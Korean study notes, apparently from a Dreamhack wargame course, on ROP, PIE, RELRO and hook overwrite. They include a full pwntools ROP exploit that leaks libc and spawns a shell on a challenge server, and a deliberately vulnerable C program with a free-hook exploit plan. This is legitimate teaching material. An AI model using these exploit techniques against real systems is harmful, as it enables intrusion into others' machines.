위에서 system 함수의 주소와 "/bin/sh" 문자열의 주소를 구했기 때문에, pop rdi; ret 가젯을 이용하면 system("/bin/sh")을 호출하여 셸을 획득할 수 있다.
익스플로잇 시 사용하는 가젯은 pwntools의 ROP 클래스의 메서드 함수인 find_gadget을 사용하여 구했다.

#### 최종 코드
<code>
	from pwn import *

	def slog(symbol, addr):
	    return success(symbol + ": " + hex(addr))

	#context.log_level = 'debug'

	p = remote('host3.dreamhack.games', 10263)
	#p = process("./basic_rop_x64")
	e = ELF("./basic_rop_x64")
	#libc = e.libc
	libc = ELF("./libc.so.6", checksec=False)
	r = ROP(e)

	read_plt = e.plt["read"]
	read_got = e.got["read"]
	write_plt = e.plt["write"]
	write_got = e.got["write"]
	main = e.symbols["main"]

	read_offset = libc.symbols["read"]
	system_offset = libc.symbols["system"]
	sh = list(libc.search(b"/bin/sh"))[0]

	pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
	pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

	# Stage 1
	payload:bytes = b'A' * 0x48

	# write(1, read@got, 8)
	payload += p64(pop_rdi) + p64(1)
	payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
	payload += p64(write_plt)

	# return to main
	payload += p64(main)

	p.send(payload)

	p.recvuntil(b'A' * 0x40)
	read = u64(p.recvn(6)+b'\x00'*2)
	lb = read - read_offset
	system = lb + system_offset
	binsh = sh + lb

	slog("read", read)
	slog("libc base", lb)
	slog("system", system)
	slog("/bin/sh", binsh)

	# Stage 2
	payload: bytes = b'A' * 0x48

	# system("/bin/sh")
	payload += p64(pop_rdi) + p64(binsh)
	payload += p64(system)

	p.send(payload)
	p.recvuntil(b'A' * 0x40)

	p.interactive()

	</code>

# PIC & PIE
## PIC
리눅스에서 ELF는 실행 파일과 공유 오브젝트로 두 가지 존재한다. 실행 파일은 addr처럼 일반적인 실행 파일이 해당하고, 공유 오브젝트는 libc.so와 같은 라이브러리 파일이 해당한다.
공유 프로젝트는 기본적으로재배치가 가능하도록 설계되어 있다. 재배치가 가능하다는 것은 메모리의 어느 주소에 적재되어도 코드의 의미가 훼손되지 않음을 의미하는데, 컴퓨터 과학에서는 이런 성질을 만족하는 코드를 Position-INdependent Code(PIC)라고 부른다.

gcc는 PIC 컴파일을 지원한다. PIC가 적용된 바이너리와 그렇지 않은 바이너리를 비교하기 위해 다음 예제를 컴파일하고 컴파일하고 어셈 코드를 비교해보자.

## PIC 코드 분석
no_pic와 pic의 main 함수를 비교해보면, main+14에서 "%p" 문자열을 printf에 전달하는 방식이 조금 다르다. no_pic에서는 0x4005a1 라는 절대 주소로 문자열을 참조하고 있따.
반면, pic는 문자열의 주소를 rip+0xa2로 참조하고 있다.

바이너리가 매핑되는 주소가 바뀌면 0x4005a1에 있던 데이터도 함께 이동하므로 no_pic의 코드는 제대로 실행되지 못한다.
그러나 pic의 코드는 rip를 기준으로 데이터를 상대참조하기 때문에 바이너리가 무작위 주소에 매핑돼도 제대로 실행될 수 있다.

## PIE
Position-Independent Executable(PIE)은 무작위 주소에 매핑돼도 실행 가능한 실행 파일을 뜻한다.
ASLR이 도입되기 전에는 실행 파일을 무작위 주소에 매핑할 필요가 없다. 그래서 리눅스의 실행 파일 형식은 재배치를 고려하지 않고 설계되었다.
이후에 ASLR이 도입되었을 때는 실행 파일도 무작위 주소에 매핑될 수 있게 하고 싶었으나, 이미 널리 사용되는 실행 파일의 형식을 변경하면 호환성 문제가 발생할 것이 분명했다.
그래서 개발자들은 원래 재배치가 가능했던 공유 오브젝트를 실행파일로 사용하기로 했다.

실제 리눅스의 기본 실행파일 중 하나인 /bin/sh의 파일 헤더를 살펴보면, Type이 공유 오브젝트를 나타내는 DYN(ET_DYN)임을 알 수 있다.

## PIE on ASLR
PIE는 재배치가 가능하므로, ASLR이 적용된 시스템에서는 실행 파일도 무작위 주소에 적재된다. 반대로, ASLR이 적용되지 않은 시스템에서는 PIE가 적용된 바이너리더라도 무작위 주소에 적재되지 않는다.
Mitigation: ASLR & NX 에서 사용한 예제를 이번에는 PIE를 적용하여 컴파일하고 실행 결과를 확인해보자. 현대 gcc는 기본적으로 PIE를 적용하므로 모든 옵션을 제거하면 PIE가 적용된 바이너리로 컴파일 한다.

PIE가 적용되자 main 함수의 주소가 매 실행마다 바뀌고 있음을 알 수 있다.

## PIE 우회
### 코드 베이스 구하기
ASLR환경에서 PIE가 적용된 바이너리는 실행될 때 마다 다른 주소에 적재된다. 그래서 코드 영역의 가젯을 사용하거나, 데이터 영역에 접근하려면 바이너리가 적재된 주소를 알아야 한다.
이 주소를 PIE 베이스, 또는 코드 베이스라고 부른다. 코드 베이스를 구하려면 라이브러리의 베이스 주소를 구할 때 처럼 코드 영역의 임의 주소를 읽고, 그 주소에서 오프셋을 빼야한다.
이 과정은 RoP에서 라이브러리의 베이스 주소를 구하는 과정과 크게 다르지 않다.

### partial overwrite
코드 베이스를 구하기 어렵다면 반환 주소의 일부 바이트만 덮는 공격을 고려해볼 수도 있다. 이러한 공격 기법을 Partial Overwrite라고 부른다. 일반적으로 함수의 반환 주소는 호출 함수의 내부를 가리킨다. 특정 함수의 호출 관계는 정적 분석 또는 동적 분석으로 쉽게 확인할 수 있으므로, 공격자는 반환 주소를 예측할 수 있다.

ASLR의 특성 상, 코드 영역의 주소도 하위 12비트 값은 항상 같다. 따라서 사용하려는 코드 가젯의 주소가 반환 주소와 하위 한 바이트만 다르다면, 이 값만 덮어서 원하는 코드를 실행시킬 수 있다. 
그러나 만약 두 바이트 이상이 다른 주소로 실행 흐름을 옮기고자 한다면, ASLR로 뒤섞이는 주소를 맞춰야 하므로 브루트 포싱이 필요하며, 공격이 확률에 따라 성공하게 된다.

## 키워드
* 상대참조 : 어떤 값을 기준으로 다른 주소를 지정하는 방식
* Position Independent Code(PIC) : 어떤 주소에 매핑되어도 실행 가능한 코드. 절대 주소를 사용하지 않으며 일반적으로 rip를 기준으로 한 상대 주소를 사용함
* Position Independent Executable (PIE) : 어떤 주소에 매핑되어도 실행 가능한 실행 파일. pIE의 코드는 모두 PIC이다. 자체적으로 보호 기법은 아니지만 ASLR이 적용된 환경에서는 시스템을 더욱 안전하게 만드는 효과가 있다.
* Partial Overwrite : 어떤 값을 일부분만 덮는 공격 방법. PIE를 우회하기 위해 사용될 수 있음.

# RELRO

* .got와 got.plt
Partial RELRO가 적용된 바이너리는 got와 관련된 섹션이 .got와 .got.plt로 두 개가 존재한다. 전역 변수 중에서 실행되는 시점에 바인딩되는 변수는 .got에 위치한다. 바이너리가 실행될 때는 이미 바인딩이 완료되어 있으므로 이 영역에 쓰기 권한을 부여하지 않는다.

반면 실행 중에 바인딩 되는 변수는 .got.plt에 위치한다. 이 영역은 실행 중에 값이 써져야 하므로 쓰기 권한이 부여된다. Partial RELRO가 적용된 바이너리에서 대부분 함수들의 GOT 엔트리는 .got.plt에 저장된다.

## RELRO 기법 우회

Partial RELRO의 경우, .init_array와 .fini_array에 대한 쓰기 권한이 제거되어 두 영역을 덮어쓰는 공격을 수행하기 어려워진다.
하지만 .got.plt 영역에 대한 쓰기 권한이 존재하므로 GOT overwrite 공격을 활용할 수 있다.
FULL RELRO의 경우, .init_array, .fini_array 뿐만 아니라 .got 영역에도 쓰기 권한이 제거되었다.
그래서 공격자들은 덮어쓸 수 있는 다른 함수 포인터를 찾다가 라이브러리에 위치한 hook을 찾아냈다.
라이브러리 함수의 대표적인 hook이 malloc hook과 free hook이다.
원래 이 함수 포인터는 동적 메모리의 할당과 해제 과정에서 발생하는 버그를 디버깅하기 쉽게 하려고 만들어졌다.

malloc 함수의 코드를 살펴보면, 함수의 시작 부분에서 `__malloc hook`이 존재하는지 검사하고, 존재하면 이를 호출한다. `__malloc_hook`은 libc.so에서 쓰기 가능한 영역에 위치한다.
따라서 공격자는 libc가 매핑된 주소를 알 때, 이 변수를 조작하고 malloc을 호출하여 실행 흐름을 조작할 수 있다.

이와 같은 공격 기법을 통틀어 Hook Overwrite라고 부른다.

## 키워드
* RELocation Read-Only: 불필요한 데이터 영역에 쓰기 권한을 제거함.
* Partial RELRO : init array, fini array 등 여러 섹션에 쓰기 권한을 제거함. Lazy binding을 사용하므로 라이브러리 함수들의 GOT 엔트리는 쓰기가 가능함. GOT Overwrite등의 공격으로 우회가 가능함.
* Full RELRO : init array, fini array 뿐만 아니라 GOT에도 쓰기 권한을 제거함. Lazy binding을 사용하지 않으며 라이브러리 함수들의 주소는 바이너리가 로드되는 시점에 바인딩됨.
libc의 malloc hook, free hook과 같은 함수 포인터를 조작하는 공격으로 우회할 수 있음.

# Hook Overwrite
컴퓨터 과학에서는 운영체제가 어떤 코드를 실행하려 할 때, 이를 낚아채어 다른 코드가 실행되게 하는 것을 Hooking이라고 부르며, 이때 실행되는 코드를 Hook이라고 부른다.
후킹은 함수에 훅을 심어서 함수의 호출을 모니터링 하거나, 함수에 기능을 추가할 수도 있고, 아니면 아예 다른 코드를 심어서 실행 흐름을 변조할 수도 있다.

malloc과 free에 훅을 설치하면 소프트웨어에서 할당하고, 해제하는 메모리를 모니터링할 수 있다. 이를 더더욱 응용하면 모든 함수의 도입 부분에 모니터링 함수를 훅으로 설치하여 어떤 소프트웨어가 실행 중에 호출하는 함수를 모두 추적할 수도 있다.

이러한 모니터링 기능은 해커에 의해 악용될 수도 있다. 해커가 키보드의 키 입력과 관련된 함수에 훅을 설치하면, 사용자가 입력하는 키를 모니터링하여 자신의 컴퓨터로 전송하는 것도 가능하다.

본 강의에서
1. 훅 오버라이트
훅의 특징을 이용한 공격기법이다. libc 데이터 영역에는 malloc()과 free()를 호출할 때 함께 호출되는 훅이 함수 포인터 형태로 존재한다. 이 함수 포인터를 임의의 함수 주소로 오버라이트하여 악의적인 코드를 실행하는 기법을 배울 것이다. Full RELRO가 적용되더라도 libc의 데이터 영역에는 쓰기가 가능하므로 Full RELRO를 우회하는 기법이기도 하다.

2. libc 내에 존재하는 가젯인 원가젯
기존에는 셸을 실행하려면 여러 개의 가젯을 조합해서 ROP Chain을 구성했지만, 원가젯은 단일 가젯만으로도 셸을 실행할 수 있는 매우 강력한 가젯이다. 하지만 원 가젯은 버전마다 다르게 존재하며, 사용하기 위한 제약 조건도 모두 다르다. 일반적으로 버전이 높아질수록 제약 조건을 만족하기가 어려워지는 특성이 있다.

를 배운다.

본 강의에서는 실습의 편의성을 위해 malloc(), free()의 훅이 유효하면서 원가젯의 제약 조건을 쉽게 만족할 수 있는 Ubuntu 18.04 버전의 환경에서 진행한다. Dockerfile을 제공하므로 빌드하고 실행한 후 컨테이너 내부에서 실습을 진행해보자.

## 메모리 함수 훅
### malloc, free, realloc hook
C언어에서 메모리의 동적 할당과 해제를 담당으로 하는 함수는 malloc, free, realloc이 대표적. 각 함수는 libc.so에 구현되어 있다.

libc에는 이 함수들의 디버깅 편의를 위해 훅 변수가 정의되어 있다. 예를 들어 malloc함수는 `__malloc _hook` 변수의 값이 NULL이 아닌지 검사하고, 아니라면 malloc을 수행하기 전에 `__malloc_hook`이 가리키는 함수를 먼저 실행한다. 이때, malloc의 인자는 훅 함수에 전달된다. 같은 방식으로 free, realloc도 각각 `__free_hook`, `__realloc_hook`이라는 훅변수를 사용한다.

## Hook overwrite
앞서 배운 정보를 종합해보면, malloc, free, realloc에는 각각에 대응되는 훅 변수가 존재하며, 앞서 설명한 바와 같이 이들은 libcdml bss 섹션에 위치하여 실행 중에 덮어쓰는 것이 가능하다. 또한, 훅을 실행할 때 기존 함수에 전달한 인자를 같이 전달해 주기 때문에 `__malloc_hook`을 system 함수의 주소로 덮고, malloc("/bin/sh")을 호출하여 셸을 획득하는 등의 공격이 가능하다.

하단의 코드는 훅을 덮는 공격이 가능함을 보이는 Proof-of-Concept(PoC)다. 컴파일하고 실행하면, `__free_hook`을 system 함수로 덮고, free("/bin/sh")를 호출하자 셸이 획득되는 것을 확인할 수 있다.

Full RELRO가 적용된 바이너리에도 라이브러리의 훅에는 쓰기 권한이 남아있기 때문에 이러한 공격을 고려해볼 수 있다.
앞서 살펴봤듯이 `__free_hook`이나 `__malloc_hook`과 같은 훅은 libc에 쓰기 권한으로 존재하는 함수포인터이며, 간접적으로 free()와 malloc()을 호출하여 손쉽게 실행이 가능하므로 공격에 악용되기 쉽다. 그 뿐만 아니라 훅은 청크 할당과 해제가 다발적으로 일어나는 환경에서 성능에 악영향을 주기 때문에 보안과 성능 향상을 이유로 2.34 버전부터 제거되었다.

## free Hook Overwrite
이번 강의에서는 free 함수의 훅을 덮는 공격을 실습해보자.
먼저 코드분석을 분석하고 익스플로잇을 해보자.

<code>
	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>

	int main() {
	  char buf[0x30];
	  unsigned long long *addr;
	  unsigned long long value;

	  setvbuf(stdin, 0, _IONBF, 0);
	  setvbuf(stdout, 0, _IONBF, 0);

	  puts("[1] Stack buffer overflow");
	  printf("Buf: ");
	  read(0, buf, 0x100);
	  printf("Buf: %s\n", buf);

	  puts("[2] Arbitrary-Address-Write");
	  printf("To write: ");
	  scanf("%llu", &addr);
	  printf("With: ");
	  scanf("%llu", &value);
	  printf("[%p] = %llu\n", addr, value);
	  *addr = value;

	  puts("[3] Arbitrary-Address-Free");
	  printf("To free: ");
	  scanf("%llu", &addr);
	  free(addr);

	  return 0;
	}

	</code>

### 보호 기법
checksec을 사용해서 fho 바이너리에 적용된 보호 기법을 살펴보면, 그동안 배운 모든 보호 기법이 적용되어 있음을 확인 할 수 있다.

### 코드분석
* 16~19 : 매우 큰 스택 버퍼 오버플로우가 발생한다. 그러나 알고 있는 정보가 없으므로 카나리를 올바르게 덮을 수 없고, 반환 주소도 유의미한 값으로 조작할 수 없다. 스택에 있는 데이터를 읽는 데 사용할 수 있을것이다.
* 21~27 : 주소를 입력하고, 그 주소에 임의의 값을 쓸 수 있다.
* 29~32 : 주소를 입력하고, 그 주소의 메모리를 해제할 수 있다.

### 공격수단
공격자는 다음 세 가지 수단을 이용하여 셸을 획득해야 한다.
1. 스택의 어떤 값을 읽을 수 있다.
2. 임의 주소에 임의 값을 쓸 수 있다.
3. 임의 주소를 해제할 수 있다.

## 설계
1. 라이브러리의 변수 및 함수들의 주소 구하기
`__free_hook`, system 함수, "/bin/sh" 문자열은 libcㅍ파일에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 오프셋을 얻을 수 있다.

메모리 상에서 이들의 주소를 계산하려면 프로세스에 매핑된 libc 파일의 베이스 주소를 알아야한다. libc의 베이스 주소를 알면 거기에 오프셋을 더하여 메모리 상 주소를 구할 수 있다.
앞서 살펴본 Exploitation Primitive 중 (1)을 이용하면 스택에 존재하는 값을 읽을 수 있는데, 스택에는 libc의 주소가 있을 가능성이 매우 크다.
특히 main 함수는 `__libc_start_main`이라는 라이브러리 함수가 호출하므로 main 함수 스택 프레임에 존재하는 반환 주소를 읽으면, 그 주소를 기반으로 libc 베이스 주소를 계산할 수 잇고 더불어 변수와 함수들의 주소를 계산할 수 있을 것이다.

2. 셸 획득
앞서 익스플로잇에 필요한 변수와 함수의 주소를 구한 후 에서 `__free_hook`의 값을 system 함수의 주소로 덮어쓰고, 에서 "/bin/sh"를 해제하게 하면 system("/bin/sh")가 호출되어 셸을 획득할 수 있다.

## 키워드

* Hooking: 어떤 함수, 프로그램, 라이브러리를 실행하려 할 때 이를 가로채서 다른 코드가 실행되게 하는 기법. 디버깅, 모니터링, 트레이싱에 사용될 수 있으며, 공격자에 의해 키로깅이나 루트킷 제작에 사용될 수 있음.

* Hook Overwrite: 바이너리에 존재하는 훅을 덮어써서 특정 함수를 호출할 때, 악의적인 코드가 실행되게 하는 공격 기법. 메모리 관리와 관련된 malloc, free, realloc등의 함수가 라이브러리에 쓰기 가능한 훅 포인터를 가지고 있어서 공격에 사용될 수 있음. Full RELRO를 우회하는 데 사용될 수 있음.

* 원 가젯(one-gadget): 실행하면 셸이 획득되는 코드 뭉치. david942j가 만들어놓은 툴을 사용하면 libc의 버전마다 유효한 원 가젯을 쉽게 찾을 수 있음.







































